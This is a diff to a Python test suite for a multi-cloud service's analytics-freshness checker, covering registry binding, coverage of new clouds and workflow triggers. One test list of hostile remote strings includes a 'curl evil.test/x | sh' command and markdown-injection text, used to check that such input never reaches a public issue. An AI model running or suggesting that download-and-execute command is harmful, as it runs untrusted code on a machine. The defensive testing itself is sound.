@@ -21,6 +21,7 @@ from pathlib import Path
 import pytest
 import yaml
 
+import clickhouse.check_fleet_analytics_freshness as fleet_module
 from clickhouse.check_fleet_analytics_freshness import evaluate_fleet
 from trusted_router import regions as regions_module
 from trusted_router.byok_v1_attestations import (
@@ -47,11 +48,21 @@ from trusted_router.operational_analytics_freshness import (
     analytics_status_section,
     analytics_status_unavailable,
 )
+from trusted_router.synthetic import fleet as synthetic_fleet
 
 ROOT = Path(__file__).resolve().parents[1]
 WORKFLOW = ROOT / ".github/workflows/check-analytics-freshness.yml"
 
 NOW = dt.datetime(2026, 8, 17, 12, 0, tzinfo=dt.UTC)
+
+#: Which clouds the parametrised fleet tests run over, DERIVED from the
+#: registry and split by property rather than by name. A hardcoded
+#: ["aws", "gcp"] would give a fourth registry entry strictly less coverage
+#: than the third one has today -- a hand-maintained cloud list, in the file
+#: whose whole thesis is that hand-maintained cloud lists are the defect.
+CHECKABLE_CLOUDS = [entry.cloud for entry in checkable_endpoints()]
+MEASURED_CLOUDS = [entry.cloud for entry in checkable_endpoints() if entry.expects_outbox]
+OUTBOX_FREE_CLOUDS = [entry.cloud for entry in checkable_endpoints() if not entry.expects_outbox]
 
 
 # ---------------------------------------------------------------------------
@@ -102,7 +113,127 @@ def test_deployment_sources_include_every_table_that_declares_a_deployment() -> 
         "trusted_router.regions.MULTICLOUD_REGION_GEO",
         "trusted_router.config.Settings.external_live_regions",
         "trusted_router.config.Settings.marketing_regions",
+        "trusted_router.config.Settings.synthetic_fleet_peers",
     }
+
+
+def test_the_peer_list_is_bound_because_it_is_this_registry_s_closest_relative() -> None:
+    """`synthetic_fleet_peers` is cloud-keyed, config-as-code, and holds status URLs.
+
+    It is the table in this repo that most resembles ANALYTICS_FRESHNESS_FLEET:
+    one entry per deployment, keyed by cloud name, carrying the public status
+    URL that every cloud already polls. A fourth cloud added there is a fourth
+    cloud whose /status.json this repo fetches on every synthetic pass -- while
+    nothing looked at its drain lag. Leaving it unbound is the outage's shape
+    with the halves swapped: the watchers know about a deployment the coverage
+    check does not.
+    """
+    peers = {
+        name for name, _url in synthetic_fleet.parse_fleet_peers(Settings.model_fields[
+            "synthetic_fleet_peers"
+        ].default)
+    }
+    source = next(
+        source
+        for source in deployment_sources()
+        if source.name == "trusted_router.config.Settings.synthetic_fleet_peers"
+    )
+
+    assert set(source.clouds) == peers
+    assert peers == {"aws", "azure", "gcp"}
+
+
+def test_a_fourth_cloud_added_only_to_the_peer_list_fails_the_binding() -> None:
+    """The proof, entered through the source this round added.
+
+    Somebody stands up a fourth deployment and wires the fleet page to watch
+    it. That single edit must be enough to demand a drain-freshness endpoint.
+    """
+    settings = Settings(
+        environment="local",
+        synthetic_fleet_peers=(
+            "gcp=https://trustedrouter.com"
+            ",aws=https://aws.trustedrouter.com"
+            ",azure=https://azure.trustedrouter.com"
+            ",oracle=https://oracle.trustedrouter.com"
+        ),
+    )
+
+    defects = registry_defects(settings=settings)
+
+    assert len(defects) == 1
+    assert defects[0].startswith("oracle:")
+    assert "trusted_router.config.Settings.synthetic_fleet_peers" in defects[0]
+
+
+@pytest.mark.parametrize(
+    ("candidate", "why_not_bound"),
+    [
+        ("catalog_data", "a provider we route to is not a deployment"),
+        ("bedrock_group_buy", "a spend source ticked on a signup form"),
+        ("primary_region", "attested-gateway regions are GCP-only by construction"),
+        ("synthetic_status_us_url", "one deployment's status service, keyed by geography"),
+    ],
+)
+def test_the_sweep_for_other_cloud_named_tables_is_written_down(
+    candidate: str, why_not_bound: str
+) -> None:
+    """Every cloud-named table that is NOT bound has to say why, in the module.
+
+    "I did not think of it" and "it does not declare a deployment" look
+    identical from outside, and this registry's whole claim is that the second
+    one has been checked. `deployment_sources()` therefore names each rejected
+    candidate and its reason; this test fails if one is dropped from the
+    docstring, which is where the next reader will look for the sweep.
+    """
+    doc = deployment_sources.__doc__ or ""
+
+    assert candidate in doc, f"{candidate} not accounted for ({why_not_bound})"
+
+
+# ---------------------------------------------------------------------------
+# A bound source that has gone empty proves nothing.
+# ---------------------------------------------------------------------------
+
+
+def test_a_deployment_source_that_degrades_to_zero_clouds_is_a_defect(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """The vacuous-union hole: `set() >= set()` is True, and nothing notices.
+
+    Every "is this cloud covered?" question is asked against a UNION, so a
+    source that stops contributing does not fail anything -- it just quietly
+    stops being part of the requirement. That is the same class of defect as
+    the outage: a signal that reports success because it measured nothing.
+    """
+    monkeypatch.setattr(regions_module, "MULTICLOUD_REGION_GEO", {})
+
+    defects = registry_defects(["aws", "azure", "gcp"])
+
+    assert any(
+        defect.startswith("trusted_router.regions.MULTICLOUD_REGION_GEO: declares NO clouds")
+        for defect in defects
+    )
+
+
+def test_a_settings_source_that_stops_being_a_string_raises_instead_of_reading_empty() -> None:
+    """`""` is the value that cannot fail: it parses to no clouds, silently.
+
+    A field retyped to a list -- a plausible refactor of a comma-separated
+    setting -- used to return "" here and delete a whole deployment source
+    without a word.
+    """
+
+    class _RetypedSettings:
+        external_live_regions = "aws-eu-west-1"
+        marketing_regions = ["us-central1"]  # was a comma-separated string
+        synthetic_fleet_peers = "gcp=https://trustedrouter.com"
+
+    with pytest.raises(TypeError) as excinfo:
+        deployment_sources(_RetypedSettings())  # type: ignore[arg-type]
+
+    assert "marketing_regions" in str(excinfo.value)
+    assert "not str" in str(excinfo.value)
 
 
 def test_deployed_clouds_is_the_union_of_every_source() -> None:
@@ -210,11 +341,40 @@ def test_a_fake_cloud_in_the_region_table_fails_the_binding(
     assert "trusted_router.regions.MULTICLOUD_REGION_GEO" in defects[0]
 
 
-def test_a_fake_cloud_in_external_live_regions_fails_the_binding() -> None:
-    """A settings default is a deployment claim too: it lights the map dot up."""
+def test_a_region_on_a_known_cloud_needs_no_table_edit_to_be_attributed() -> None:
+    """`aws-eu-west-2` is AWS because `aws-` is already a cloud namespace.
+
+    The namespace is what MULTICLOUD_REGION_GEO's rows establish, so a new
+    region on an existing cloud resolves without anybody editing a table --
+    while a prefix nobody has established cannot mint a cloud at all.
+    """
+    assert regions_module.cloud_for_region("aws-eu-west-2") == "aws"
+    assert regions_module.cloud_for_region("azure-westeurope") == "azure"
+    assert regions_module.cloud_region_namespaces() == {"aws", "azure"}
+
+
+def test_a_fourth_cloud_in_external_live_regions_fails_once_its_namespace_exists(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """A settings default is a deployment claim too: it lights the map dot up.
+
+    Entered the way a real fourth cloud arrives -- a map row first, then the
+    live list -- so the second region id resolves through the namespace the
+    first one established.
+    """
+    monkeypatch.setattr(
+        regions_module,
+        "MULTICLOUD_REGION_GEO",
+        {
+            **regions_module.MULTICLOUD_REGION_GEO,
+            "oracle-eu-frankfurt-1": regions_module.RegionGeo(
+                "oracle-eu-frankfurt-1", "Frankfurt", 50.111, 8.682, cloud="oracle"
+            ),
+        },
+    )
     settings = Settings(
         environment="local",
-        external_live_regions="aws-eu-west-1,azure-australiaeast,oracle-eu-frankfurt-1",
+        external_live_regions="aws-eu-west-1,azure-australiaeast,oracle-eu-frankfurt-2",
     )
 
     defects = registry_defects(settings=settings)
@@ -224,8 +384,44 @@ def test_a_fake_cloud_in_external_live_regions_fails_the_binding() -> None:
     assert "trusted_router.config.Settings.external_live_regions" in defects[0]
 
 
-def test_a_cloud_id_with_no_namespace_does_not_invent_a_cloud() -> None:
-    """GCP regions are bare (`us-central1`); they must not read as cloud "us"."""
+def test_a_region_id_no_table_can_attribute_is_reported_instead_of_guessed() -> None:
+    """A region id belonging to nobody must fail as itself, not as a cloud.
+
+    WHAT THIS CATCHES, and what its predecessor did not. The predecessor
+    asserted that "a cloud id with no namespace does not invent a cloud" using
+    `us-central1` and `europe-west4` -- both GCP_REGION_GEO keys, so the
+    resolver returned two branches early and the prefix fallback under test was
+    never reached. It was green about a property it never exercised, which is
+    worse than absent: it read like coverage.
+
+    The ids here are REAL GCP regions deliberately absent from that
+    hand-maintained table (Google keeps shipping regions; the table is updated
+    by hand). Under the old prefix fallback they resolved to clouds named
+    "europe", "us" and "me", and the coverage check then failed CI demanding a
+    /status.json for a cloud that does not exist. They must now be reported as
+    unattributed ids naming the setting that declares them -- which is also
+    what a genuinely new cloud entered only through settings looks like, and
+    both want the same fix: write down which cloud it is.
+    """
+    for region in ("europe-west12", "us-south1", "me-central2"):
+        assert regions_module.cloud_for_region(region) is None, region
+
+    settings = Settings(environment="local", marketing_regions="us-central1,europe-west12")
+    defects = registry_defects(settings=settings)
+
+    assert len(defects) == 1
+    assert defects[0].startswith("trusted_router.config.Settings.marketing_regions:")
+    assert "'europe-west12'" in defects[0]
+    assert "MULTICLOUD_REGION_GEO" in defects[0] and "GCP_REGION_GEO" in defects[0]
+    # And emphatically not a cloud named after a geography.
+    assert not any(defect.startswith("europe:") for defect in defects)
+
+
+def test_a_bare_gcp_region_still_resolves_to_gcp() -> None:
+    """The table's own keys, which must not read as clouds "us" or "europe"."""
+    assert regions_module.cloud_for_region("us-central1") == "gcp"
+    assert regions_module.cloud_for_region("europe-west4") == "gcp"
+
     settings = Settings(environment="local", external_live_regions="us-central1,europe-west4")
 
     assert registry_defects(settings=settings) == []
@@ -320,8 +516,7 @@ def test_a_plane_answering_for_the_wrong_cloud_fails_that_cloud() -> None:
     a 200 and a plausible section -- from the wrong deployment. Matching the
     published backend against the cloud's own is what makes that visible.
     """
-    payloads = _all_healthy()
-    payloads["azure"] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_NOT_CONFIGURED)}
+    payloads = _as_declared()
     payloads["gcp"] = _healthy("gcp", **{BACKEND_FIELD: BACKEND_POSTGRES})
 
     result = evaluate_fleet(payloads, now=NOW)
@@ -343,11 +538,20 @@ def test_a_cloud_with_a_reason_is_reported_as_unchecked_and_does_not_fail() -> N
     public status page is a job people learn to close unread, and then it is
     not watching the clouds it CAN check either.
     """
-    registry = (FleetAnalyticsEndpoint(cloud="aws", reason="control plane is not public"),)
+    registry = (
+        FleetAnalyticsEndpoint(cloud="aws", reason="control plane is not public"),
+        FleetAnalyticsEndpoint(
+            cloud="gcp",
+            status_url="https://trustedrouter.com/status.json",
+            expected_backend=BACKEND_SPANNER,
+        ),
+    )
 
-    assert registry_defects(["aws"], registry=registry) == []
+    assert registry_defects(["aws", "gcp"], registry=registry) == []
 
-    result = evaluate_fleet({}, now=NOW, registry=registry, deployed=["aws"])
+    result = evaluate_fleet(
+        {"gcp": _healthy("gcp")}, now=NOW, registry=registry, deployed=["aws", "gcp"]
+    )
 
     assert result.problems == []
     assert len(result.unchecked) == 1
@@ -361,13 +565,11 @@ def test_a_cloud_declared_outbox_free_is_unchecked_rather_than_failing() -> None
     cry-wolf shape the repo already fixed once, in the client-telemetry
     freshness check's `CANARY_COUNT_GATE_FROM` ramp-up guard.
     """
-    payloads = _all_healthy()
-    payloads["azure"] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_NOT_CONFIGURED)}
-
-    result = evaluate_fleet(payloads, now=NOW)
+    result = evaluate_fleet(_as_declared(), now=NOW)
 
     assert result.problems == []
-    assert any(note.startswith("azure: NOT CHECKED") for note in result.unchecked)
+    for cloud in OUTBOX_FREE_CLOUDS:
+        assert any(note.startswith(f"{cloud}: NOT CHECKED") for note in result.unchecked)
     assert any("expects_outbox=False" in note for note in result.unchecked)
 
 
@@ -401,14 +603,15 @@ def test_a_cloud_declared_outbox_free_that_grows_one_FAILS() -> None:
     assert any("expects_outbox=True" in problem for problem in result.problems)
 
 
-def test_a_cloud_declared_outbox_free_still_fails_when_its_database_is_broken() -> None:
+@pytest.mark.parametrize("cloud", OUTBOX_FREE_CLOUDS)
+def test_a_cloud_declared_outbox_free_still_fails_when_its_database_is_broken(cloud: str) -> None:
     """`expects_outbox=False` excuses `not_configured`, and nothing else."""
-    payloads = _all_healthy()
-    payloads["azure"] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_UNREACHABLE)}
+    payloads = _as_declared()
+    payloads[cloud] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_UNREACHABLE)}
 
     result = evaluate_fleet(payloads, now=NOW)
 
-    assert [problem for problem in result.problems if problem.startswith("azure:")]
+    assert [problem for problem in result.problems if problem.startswith(f"{cloud}:")]
 
 
 def test_unavailable_explanations_differ_per_reason() -> None:
@@ -417,7 +620,7 @@ def test_unavailable_explanations_differ_per_reason() -> None:
     `not_configured` is not "could not read the outbox": there is no outbox, the
     database is fine, and an operator sent to check it wastes the incident.
     """
-    payloads = _all_healthy()
+    payloads = _as_declared()
     payloads["aws"] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_NOT_CONFIGURED)}
     not_configured = evaluate_fleet(payloads, now=NOW).problems
 
@@ -478,22 +681,36 @@ def _all_healthy() -> dict[str, dict[str, object] | None]:
     return {entry.cloud: _healthy(entry.cloud) for entry in checkable_endpoints()}
 
 
+def _as_declared() -> dict[str, dict[str, object] | None]:
+    """Every cloud answering what the registry says it should: the clean fleet.
+
+    Derived from the registry rather than written out, so a fourth entry is
+    covered by every test built on this the day it lands. `_all_healthy` is
+    kept separate on purpose -- it makes the outbox-free clouds publish a live
+    lag, which is a FAILURE and has its own test.
+    """
+    return {
+        entry.cloud: (
+            _healthy(entry.cloud)
+            if entry.expects_outbox
+            else {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_NOT_CONFIGURED)}
+        )
+        for entry in checkable_endpoints()
+    }
+
+
 def test_whole_fleet_healthy_reports_only_the_declared_absence() -> None:
     """Azure is unchecked by declaration; the other two must be clean."""
-    payloads = _all_healthy()
-    payloads["azure"] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_NOT_CONFIGURED)}
-
-    result = evaluate_fleet(payloads, now=NOW)
+    result = evaluate_fleet(_as_declared(), now=NOW)
 
     assert result.problems == []
     assert result.ok
 
 
-@pytest.mark.parametrize("cloud", ["aws", "gcp"])
+@pytest.mark.parametrize("cloud", MEASURED_CLOUDS)
 def test_any_single_cloud_going_stale_fails_the_fleet(cloud: str) -> None:
     """One broken cloud out of three must fail. Two healthy peers are not a quorum."""
-    payloads = _all_healthy()
-    payloads["azure"] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_NOT_CONFIGURED)}
+    payloads = _as_declared()
     payloads[cloud] = _healthy(cloud, drain_lag_seconds=7_200.0)
 
     result = evaluate_fleet(payloads, now=NOW)
@@ -502,11 +719,10 @@ def test_any_single_cloud_going_stale_fails_the_fleet(cloud: str) -> None:
     assert len(result.problems) == 1
 
 
-@pytest.mark.parametrize("cloud", ["aws", "azure", "gcp"])
+@pytest.mark.parametrize("cloud", CHECKABLE_CLOUDS)
 def test_a_cloud_that_publishes_no_analytics_section_fails(cloud: str) -> None:
     """Including the outbox-free one: no section means code too old to publish."""
-    payloads = _all_healthy()
-    payloads["azure"] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_NOT_CONFIGURED)}
+    payloads = _as_declared()
     payloads[cloud] = {}
 
     result = evaluate_fleet(payloads, now=NOW)
@@ -515,10 +731,9 @@ def test_a_cloud_that_publishes_no_analytics_section_fails(cloud: str) -> None:
     assert any("does not publish drain lag" in problem for problem in result.problems)
 
 
-@pytest.mark.parametrize("cloud", ["aws", "gcp"])
+@pytest.mark.parametrize("cloud", MEASURED_CLOUDS)
 def test_a_cloud_reporting_unavailable_fails(cloud: str) -> None:
-    payloads = _all_healthy()
-    payloads["azure"] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_NOT_CONFIGURED)}
+    payloads = _as_declared()
     payloads[cloud] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable()}
 
     result = evaluate_fleet(payloads, now=NOW)
@@ -526,10 +741,10 @@ def test_a_cloud_reporting_unavailable_fails(cloud: str) -> None:
     assert any(problem.startswith(f"{cloud}:") for problem in result.problems)
 
 
-@pytest.mark.parametrize("cloud", ["aws", "azure", "gcp"])
+@pytest.mark.parametrize("cloud", CHECKABLE_CLOUDS)
 def test_a_cloud_that_could_not_be_fetched_fails(cloud: str) -> None:
     """Unreachable is a failure, not a skip: this job cannot tell down from lazy."""
-    payloads = _all_healthy()
+    payloads = _as_declared()
     payloads[cloud] = None
 
     result = evaluate_fleet(payloads, now=NOW)
@@ -537,14 +752,15 @@ def test_a_cloud_that_could_not_be_fetched_fails(cloud: str) -> None:
     assert any("could not read" in problem for problem in result.problems)
 
 
-def test_a_cloud_nobody_fetched_is_reported_rather_than_skipped() -> None:
+@pytest.mark.parametrize("cloud", CHECKABLE_CLOUDS)
+def test_a_cloud_nobody_fetched_is_reported_rather_than_skipped(cloud: str) -> None:
     """The fleet-scale version of the original bug: absence rendering as health."""
-    payloads = _all_healthy()
-    payloads.pop("azure")
+    payloads = _as_declared()
+    payloads.pop(cloud)
 
     result = evaluate_fleet(payloads, now=NOW)
 
-    assert any(problem.startswith("azure: never fetched") for problem in result.problems)
+    assert any(problem.startswith(f"{cloud}: never fetched") for problem in result.problems)
 
 
 def test_registry_defects_validate_the_registry_that_was_passed_in() -> None:
@@ -595,6 +811,140 @@ def test_registry_defects_surface_inside_the_fleet_run() -> None:
 
 
 # ---------------------------------------------------------------------------
+# A run that measured nothing is not a pass.
+# ---------------------------------------------------------------------------
+
+
+def test_a_fleet_where_nothing_was_measured_fails_instead_of_exiting_zero() -> None:
+    """Every not-a-failure outcome, stacked, used to add up to success.
+
+    Unchecked by declaration, excluded by --cloud, no registry entry at all --
+    none of those is a failure on its own, and each is right not to be. Put
+    them together and the job exits 0 having asked no cloud anything, which is
+    "configured, healthy, and empty": the exact shape of the outage, one level
+    up. The floor is what makes the union of excuses inadmissible.
+    """
+    registry = (
+        FleetAnalyticsEndpoint(cloud="aws", reason="control plane is not public"),
+        FleetAnalyticsEndpoint(cloud="gcp", reason="control plane is not public"),
+    )
+
+    result = evaluate_fleet({}, now=NOW, registry=registry, deployed=["aws", "gcp"])
+
+    assert len(result.unchecked) == 2
+    assert any(problem.startswith("nothing was measured: 0 of 2") for problem in result.problems)
+    assert not result.ok
+
+
+def test_the_floor_counts_evaluations_and_not_fetches() -> None:
+    """A cloud that was fetched and came back broken HAS been measured.
+
+    Otherwise the floor would fire alongside every real failure and add noise
+    to exactly the run an operator is reading most carefully.
+    """
+    payloads = _as_declared()
+    payloads[MEASURED_CLOUDS[0]] = _healthy(MEASURED_CLOUDS[0], drain_lag_seconds=7_200.0)
+
+    result = evaluate_fleet(payloads, now=NOW)
+
+    assert not any(problem.startswith("nothing was measured") for problem in result.problems)
+
+
+# ---------------------------------------------------------------------------
+# Privacy, second surface: the problems list is pasted into a PUBLIC issue.
+# ---------------------------------------------------------------------------
+
+#: Strings a compromised, buggy, or repointed plane could publish. Each is
+#: shaped like something that would matter if it appeared in a public issue in
+#: this repository.
+HOSTILE_REMOTE_TEXT = [
+    'connection to "tr-eu.dsql.eu-west-3.on.aws" (10.0.3.17), port 5432 failed',
+    'FATAL: role "quill-enclave-role" is not permitted to log in',
+    "@everyone see https://evil.test/urgent -- run `curl evil.test/x | sh`",
+    "```\n</details>\n# INJECTED HEADING\n",
+]
+
+
+@pytest.mark.parametrize("hostile", HOSTILE_REMOTE_TEXT)
+def test_arbitrary_remote_reason_text_never_reaches_the_problems_list(hostile: str) -> None:
+    """The clamp is airtight at the PUBLISHER. This is the other end of the wire.
+
+    `evaluate` formats what it read off a remote page into a problem line;
+    `main` writes those lines to --problems-file; the workflow pastes that file
+    verbatim into a public GitHub issue body. So a plane that publishes
+    whatever it likes -- older code, a misconfiguration, a repointed status
+    hostname, an attacker -- chooses text in an issue in this repository unless
+    the value is narrowed HERE too, on the way in, exactly as the publisher
+    narrows it on the way out.
+    """
+    payloads = _as_declared()
+    payloads["aws"] = {
+        ANALYTICS_STATUS_KEY: {"available": False, "reason": hostile},
+    }
+
+    result = evaluate_fleet(payloads, now=NOW)
+    rendered = "\n".join([*result.problems, *result.unchecked])
+
+    assert [problem for problem in result.problems if problem.startswith("aws:")]
+    assert hostile not in rendered
+    for fragment in ("dsql", "10.0.3.17", "evil.test", "INJECTED", "quill-enclave-role"):
+        assert fragment not in rendered
+    assert "NOT reproduced here" in rendered
+
+
+def test_an_arbitrary_remote_backend_name_never_reaches_the_problems_list() -> None:
+    """Same wire, same surface, the other narrowed field."""
+    payloads = _as_declared()
+    payloads["aws"] = _healthy("aws", **{BACKEND_FIELD: "dsql://tr-eu.eu-west-3.on.aws"})
+
+    result = evaluate_fleet(payloads, now=NOW)
+    rendered = "\n".join(result.problems)
+
+    assert "tr-eu.eu-west-3.on.aws" not in rendered
+    assert "'unknown'" in rendered
+
+
+def test_an_unhashable_remote_reason_does_not_crash_the_run() -> None:
+    """`x in frozenset` raises TypeError on a list, outside anybody's try block.
+
+    A checker that dies on the payload it was supposed to report is a checker
+    that goes quiet exactly when something is wrong with a plane.
+    """
+    payloads = _as_declared()
+    payloads["aws"] = {ANALYTICS_STATUS_KEY: {"available": False, "reason": ["unreachable"]}}
+
+    result = evaluate_fleet(payloads, now=NOW)
+
+    assert [problem for problem in result.problems if problem.startswith("aws:")]
+
+
+def test_hostile_remote_text_cannot_reach_the_issue_body_file(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    """End to end through `main`, because the issue body IS this file.
+
+    The workflow does `cat /tmp/problems.txt` into the issue body, so this is
+    the last boundary before publication and the only one that proves the
+    clamp survives the whole path rather than just `evaluate`.
+    """
+    hostile = HOSTILE_REMOTE_TEXT[0]
+
+    def fake_fetch(url: str) -> dict[str, object]:
+        return {ANALYTICS_STATUS_KEY: {"available": False, "reason": hostile}}
+
+    monkeypatch.setattr(fleet_module, "fetch_status", fake_fetch)
+    problems_file = tmp_path / "problems.txt"
+
+    exit_code = fleet_module.main(["--problems-file", str(problems_file)])
+    body = problems_file.read_text()
+
+    assert exit_code == 1
+    assert hostile not in body
+    assert "10.0.3.17" not in body and "dsql" not in body
+    assert "aws:" in body
+
+
+# ---------------------------------------------------------------------------
 # The workflow. Parsed, not grepped.
 # ---------------------------------------------------------------------------
 
@@ -625,8 +975,8 @@ def _check_run_script(workflow: dict[str, object]) -> str:
     raise AssertionError("no step runs the fleet freshness module")
 
 
-def test_workflow_ships_without_a_schedule_until_every_cloud_publishes() -> None:
-    """A green-by-construction cron is worse than no cron at all.
+def test_workflow_ships_without_a_schedule_or_a_push_trigger() -> None:
+    """No trigger may fire this job before a control plane publishes the section.
 
     Merging main auto-deploys the GCP control plane ONLY (deploy.yml); AWS-EU
     and Azure are hand-run scripts and are already behind. A `schedule:` landed
@@ -637,24 +987,42 @@ def test_workflow_ships_without_a_schedule_until_every_cloud_publishes() -> None
     `CANARY_COUNT_GATE_FROM` ramp-up guard exists to avoid, and the same reason
     this job's single-cloud predecessor shipped scheduleless.
 
-    The precondition and the one-line follow-up are in the workflow header, and
-    this test is what stops the cron arriving before the deploys do.
+    `push:` was held to be different -- one run, on the merge, aimed at
+    somebody still holding the context. It is not. On that merge NO plane
+    publishes the section yet, so the run fails, and the failure step opens a
+    LABELLED PUBLIC ISSUE about a state this repository has already written
+    down as expected. Filing an automated issue against a known, documented,
+    not-yet-true precondition is the cry-wolf failure with a shorter fuse. The
+    honest sequencing is: deploy, dispatch once by hand, then enable both
+    triggers in one commit that also deletes this test.
+
+    `workflow_dispatch` is the whole trigger surface until then.
     """
     on_block = _on_block(_workflow())
 
     assert "schedule" not in on_block
-    assert "workflow_dispatch" in on_block
-    assert "push" in on_block
+    assert "push" not in on_block
+    assert set(on_block) == {"workflow_dispatch"}
 
 
 def test_workflow_header_states_the_precondition_and_the_follow_up() -> None:
-    """A withheld trigger is only honest if the note says how to un-withhold it."""
+    """A withheld trigger is only honest if the note says how to un-withhold it.
+
+    Including the part that is only discoverable by breaking it: turning the
+    triggers on fails two tests, and the header names both, so nobody learns
+    what they changed from a red CI run.
+    """
     workflow = WORKFLOW.read_text()
 
     assert "OPERATOR STEPS BEFORE THE SCHEDULE IS ENABLED" in workflow
     assert "PRECONDITION" in workflow
     assert 'schedule: [{cron: "20 7 * * *"}]' in workflow
     assert "cries wolf" in workflow
+    # Named, not described. A rename that does not update the header fails here.
+    assert "::test_workflow_ships_without_a_schedule_or_a_push_trigger" in workflow
+    assert "::test_workflow_still_does_not_page_before_the_field_is_deployed" in workflow
+    assert "tests/test_analytics_freshness_registry.py" in workflow
+    assert "tests/test_aws_analytics_drain_install.py" in workflow
 
 
 def test_the_scheduled_run_line_can_never_be_narrowed_to_one_cloud() -> None:
